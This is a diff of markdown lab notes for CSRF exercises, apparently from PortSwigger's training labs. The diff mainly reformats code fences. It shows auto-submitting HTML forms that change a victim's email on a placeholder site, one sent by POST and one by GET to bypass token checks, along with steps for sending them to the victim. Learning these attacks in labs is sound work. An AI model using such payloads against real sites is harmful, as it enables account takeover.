@@ -17,7 +17,7 @@ Cred - `wiener:peter`
 3. check the conditions.
 
 4. Make CSRF payload or you can use burpsuite pro for this.
-   ```
+```
 <html> 
    <body>
 	   <form action="https://vulnerable-website.com/email/change" method="POST">  
@@ -28,9 +28,8 @@ Cred - `wiener:peter`
 	   </script>
 	</body>
 </html>
-   ```
-
-5. Put this is server and click on store and  Send it to the Victim.
+```
+5.  Put this is server and click on store and  Send it to the Victim.
 
 6. Make sure that you change email every time you send.
 
@@ -63,7 +62,7 @@ Website strick check every parameter for csrf when method is `POST` But sometime
 3. check the conditions, if conditions are not satify try using GET to bypass CSRF token.
 
 4. Make CSRF payload or you can use burpsuite pro for this.
-   ```
+```
 <html> 
    <body>
 	   <form action="https://vulnerable-website.com/email/change" method="GET">  
@@ -73,8 +72,9 @@ Website strick check every parameter for csrf when method is `POST` But sometime
 		   document.forms[0].submit();
 	   </script>
 	</body>
-</html>`
-   ```
+</html>
+
+```
 
 5. Put this is server and click on store and  Send it to the Victim.
 
